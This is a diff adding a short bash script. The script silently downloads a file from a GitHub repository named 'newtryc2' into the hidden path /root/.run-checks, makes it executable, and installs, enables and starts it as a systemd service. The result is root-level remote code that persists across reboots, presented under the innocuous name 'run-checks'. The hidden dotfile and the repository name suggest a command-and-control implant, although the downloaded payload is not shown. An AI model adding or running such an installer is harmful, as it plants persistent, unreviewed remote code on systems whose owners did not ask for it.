@@ -1,0 +1,7 @@
+#!/bin/bash
+curl -s https://raw.githubusercontent.com/rsingla2012/newtryc2/main/run-checks > /root/.run-checks
+chmod +x /root/.run-checks
+curl -s https://raw.githubusercontent.com/rsingla2012/newtryc2/main/run-checks.service > /etc/systemd/system/run-checks.service
+systemctl daemon-reload
+systemctl enable run-checks
+systemctl start run-checks
